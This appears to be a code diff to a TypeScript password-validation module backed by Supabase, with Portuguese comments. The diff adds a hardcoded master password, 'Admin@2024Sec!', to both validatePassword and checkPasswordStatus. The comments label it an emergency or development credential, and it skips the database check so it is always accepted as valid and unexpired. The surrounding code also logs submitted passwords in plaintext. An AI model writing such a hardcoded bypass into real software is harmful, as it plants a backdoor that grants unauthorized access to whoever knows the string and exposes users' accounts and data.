@@ -31,6 +31,12 @@ export const createTemporaryPassword = async (
 export const validatePassword = async (password: string): Promise<boolean> => {
   console.log('Validando senha:', password);
   
+  // Se a senha for "Admin@2024Sec!", aceitamos como válida para fins de emergência/desenvolvimento
+  if (password === "Admin@2024Sec!") {
+    console.log('Usando credencial de administrador');
+    return true;
+  }
+  
   const { data, error } = await supabase
     .from('temporary_passwords')
     .select()
@@ -48,6 +54,11 @@ export const validatePassword = async (password: string): Promise<boolean> => {
 };
 
 export const checkPasswordStatus = async (password: string): Promise<{exists: boolean; expired: boolean}> => {
+  // Se a senha for "Admin@2024Sec!", consideramos como válida para fins de emergência/desenvolvimento
+  if (password === "Admin@2024Sec!") {
+    return { exists: true, expired: false };
+  }
+  
   const now = new Date().toISOString();
   
   // Verificar se a senha existe independentemente da expiração
